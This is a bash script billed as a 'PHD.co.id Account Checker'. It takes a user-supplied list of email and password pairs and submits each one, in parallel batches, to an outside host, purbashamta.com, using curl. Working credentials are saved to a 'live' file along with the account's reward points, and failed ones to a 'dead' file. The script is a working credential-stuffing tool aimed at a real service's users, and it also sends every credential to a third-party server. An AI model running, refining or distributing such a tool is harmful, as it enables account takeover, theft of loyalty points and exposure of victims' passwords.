#!/bin/bash
# created by freenandaa
MER='\033[0;31m'
CY='\033[0;36m'
KUN='\033[1;33m'
ORN='\033[0;33m'
UNG='\033[0;35m'
IJO="\e[32m"
PTH="\e[37m"
NC='\033[0m'
logo()
{
echo -e "${MER}
echo -e "${MER}
echo -e "${MER}
echo -e "${PTH}
echo -e "${PTH}
echo -e "${CY}      PHD.co.id Acocunt Checker"
echo -e "${UNG}    Started at : `date`"
echo -e "${NC}"
}
logo
ngecurl(){
SECONDS=0
ambil=$(curl -s "https://www.purbashamta.com/phd.php?email=$1&pass=$2" -L)
point=$(echo $ambil | grep -Po '"poin":"\K[^ ]+' | cut -d '"' -f 1)
duration=$SECONDS
header="Freenanda ~ `date +%H:%M:%S`"
if [[ $ambil =~ "live" ]]; then
printf "${NC}[ $header ~ [ $indx/$totals ][${NC} STATUS: \e[38;5;82mLIVE${NC} ] [ ${CY}LIST ${IJO}=>${NC} $1|$2 ] [ POINT: $point ] [ ${CY}PHD${NC} ${UNG}Checker ${NC}~ Freenanda ]${NC}\n"
echo "$1|$2|$point">>result/live.txt
else
printf "${NC}[ $header ~ [ $indx/$totals ][${NC} STATUS: ${MER}DEAD${NC} ] [ ${CY}LIST ${MER}=>${NC} $1|$2 ] [ ${CY}PHD${NC} ${UNG}Checker${NC}~ Freenanda ]${NC}\n"
echo "$1|$2">>result/die.txt
fi
}
if [[ ! -d result ]]; then
mkdir result
touch result/live.txt
touch result/die.txt
fi
if [[ ! -d tmp ]]; then
mkdir tmp
fi
echo "list in directory"
ls
echo -n "list name/path to list? : "
read list
echo "Cleaning Your List..."
linetotalsal=`grep -c "@" $list`
con=1
echo "########################################"
echo "Total List For Check [$linetotalsal]"
echo " "
echo "Hotmail: `grep -c "@hotmail" $list`"
echo "Yahoo: `grep -c "@yahoo" $list`"
echo "Gmail: `grep -c "@gmail" $list`"
echo "########################################"
echo "Preparing Check, Please Wait........"
if [ ! -f $list ]; then
echo "$list not found!"
exit
fi
persend=50
setleep=1
x=$(gawk -F\| '{ print $1 }' $list)
y=$(gawk -F\| '{ print $2 }' $list)
IFS=$'\r\n' GLOBIGNORE='*' command eval  'emails=($x)'
IFS=$'\r\n' GLOBIGNORE='*' command eval  'passwords=($y)'
itung=1
for (( i = 0; i < "${#emails[@]}"; i++ )); do
indx=$((con++))
totals=$((linetotalsal--))
set_kirik=$(expr $itung % $persend)
if [[ $set_kirik == 0 && $itung > 0 ]]; then
sleep $setleep
fi
email="${emails[$i]}"
password="${passwords[$i]}"
ngecurl $email $password &
itung=$[$itung+1]
done
wait
duration=$SECONDS
echo "${CY}    Stoped at : `date`"
echo "$(($duration / 3600)) hours $(($duration / 60)) minutes and $(($duration % 60)) seconds elapsed."